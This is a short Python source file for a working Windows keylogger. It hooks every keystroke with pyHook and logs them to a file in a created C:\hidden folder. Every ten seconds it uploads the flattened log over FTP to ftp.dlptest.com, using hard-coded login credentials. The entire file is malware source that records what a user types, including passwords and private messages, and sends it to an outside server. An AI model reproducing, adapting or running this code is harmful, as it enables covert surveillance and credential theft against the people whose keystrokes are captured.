import pyHook, pythoncom, sys, logging
import os
import time
from ftplib import FTP

newpath = r'C:\hidden'
if not os.path.exists(newpath):
    os.makedirs(newpath)

t = time.time()

t_end = time.time() + 10

file_log = 'C:\\hidden\hidden.txt'


def CheckTime(endtime):
    global t

    if time.time() - t > 10:

        data = open('C:\\hidden\\hidden.txt').read()
        currenttime = str(time.time())
        newdoc = open('C:\\hidden\\formatted' + currenttime + ".txt", "w")
        newdoc.write(data.replace('\n', "").replace('\r', ""))
        newdoc.close()


        #Open connection to FTP server and upload file
        ftpserver = FTP('ftp.dlptest.com')
        ftpserver.login('dlpuser@dlptest.com', 'fwRhzAnR1vgig8s')
        ftpserver.storbinary("STOR Test123.txt", open('C:\\hidden\\formatted' + currenttime + ".txt", "r"))

        t = time.time()
        return

    else:

        return


def OnKeyboardEvent(event):
    CheckTime(t_end)
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

exit()
